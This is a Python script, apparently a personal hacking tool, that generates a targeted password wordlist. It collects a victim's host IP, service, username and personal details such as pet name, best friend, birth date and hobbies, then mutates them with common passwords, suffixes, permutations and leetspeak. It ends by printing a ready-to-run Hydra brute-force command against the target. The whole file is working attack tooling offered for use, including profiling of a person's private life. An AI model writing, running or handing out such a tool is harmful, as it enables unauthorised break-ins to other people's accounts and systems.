import itertools

# Expanded common passwords list
common_passwords = [
    "password", "admin", "qwerty", "123456", "123456789", "letmein", "welcome",
    "iloveyou", "football", "monkey", "abc123", "sunshine", "princess", "dragon",
    "passw0rd", "superman", "batman", "trustno1", "hunter2", "hello", "freedom",
    "shadow", "master", "killer", "ninja", "mustang", "jordan", "monkey123",
    "qwerty123", "zaq12wsx", "asdfgh", "111111", "666666", "7777777", "password1",
    "P@ssw0rd", "Pa$$w0rd", "1234abcd", "welcome123", "admin123"
]

special_chars = ["!", "@", "#", "$", "_", ".", "-", "*"]

# Function to collect target details
def get_input(prompt):
    while True:
        value = input(prompt)
        if value == "99":
            print("\n❌ Exiting script...")
            exit()
        elif value == "0":
            return None  # Skip this step
        else:
            return value.strip()

print("🔹 Smart Multi-Level Wordlist Generator 🔹")
print("💡 Enter details or press 0 to skip, 99 to quit.")

target_info = {}

# 🔥 Step 1: Target Host Details
target_info["host_ip"] = get_input("🖥️ Enter target IP (e.g., 192.168.1.1): ")
target_info["os"] = get_input("💻 Enter target OS (Windows/Linux/macOS): ")
target_info["service"] = get_input("🌐 Enter target service (e.g., SSH, FTP, RDP): ")
target_info["username"] = get_input("👤 Enter known username: ")

# 🏆 Step 2: Personal Details
target_info["first_name"] = get_input("1️⃣ Enter first name: ")
target_info["full_name"] = get_input("2️⃣ Enter full name: ")
target_info["nickname"] = get_input("3️⃣ Enter nickname or username: ")

# 🏡 Step 3: Background & Social Info
target_info["address"] = get_input("4️⃣ Enter part of address (city, street, etc.): ")
target_info["social_media"] = get_input("5️⃣ Enter social media username: ")

# 💖 Step 4: Relationships
target_info["best_friend"] = get_input("6️⃣ Enter best friend’s name: ")
target_info["pet_name"] = get_input("7️⃣ Enter pet's name: ")

# 📅 Step 5: Key Dates
target_info["dob"] = get_input("8️⃣ Enter Date of Birth (DDMMYYYY): ")
target_info["year"] = get_input("9️⃣ Enter birth year (YYYY): ")

# 🎭 Step 6: Interests & Extra Info
hobbies = get_input("🔟 Enter hobbies (comma-separated): ")
target_info["hobbies"] = hobbies.split(',') if hobbies else []

# 🔧 Step 7: Special Custom Words
extra_words = get_input("1️⃣1️⃣ Enter any extra words (comma-separated): ")
target_info["extra_words"] = extra_words.split(',') if extra_words else []

# 🔥 Ask for a custom wordlist name
wordlist_name = get_input("📝 Enter wordlist filename (default: custom_wordlist.txt): ")
if not wordlist_name:
    wordlist_name = "custom_wordlist.txt"  # Default name

# 🔥 Start generating passwords
custom_words = []

for key, value in target_info.items():
    if isinstance(value, list):
        custom_words.extend(value)  # Add list items
    elif value:
        custom_words.append(value)  # Add single value

# Add common passwords to increase effectiveness
custom_words.extend(common_passwords)

# Generate password variations
combinations = set()  # Using a set to avoid duplicates

# Simple words
combinations.update(custom_words)

# Add numbers & special characters
for word in custom_words:
    for num in ["123", "1234", "007", "2024", "786"]:
        combinations.add(word + num)
        combinations.add(num + word)

    for char in special_chars:
        combinations.add(word + char)
        combinations.add(char + word)

# Generate mix of two words
for combo in itertools.permutations(custom_words, 2):
    combinations.add("".join(combo))

# Leetspeak variations
leet_replacements = {"a": "@", "s": "$", "i": "1", "o": "0", "e": "3"}
for word in custom_words:
    leet_word = "".join(leet_replacements.get(c, c) for c in word)
    combinations.add(leet_word)

# Save to the chosen wordlist file
with open(wordlist_name, "w") as f:
    for password in combinations:
        f.write(password + "\n")

print(f"\n✅ Custom wordlist saved as: {wordlist_name}")
print(f"🔹 Total passwords generated: {len(combinations)}")

# Suggested Hydra command for brute-force attack
if target_info["host_ip"] and target_info["service"] and target_info["username"]:
    print("\n🔥 Use this Hydra command to start cracking:")
    print(f"hydra -l {target_info['username']} -P {wordlist_name} {target_info['host_ip']} {target_info['service']}")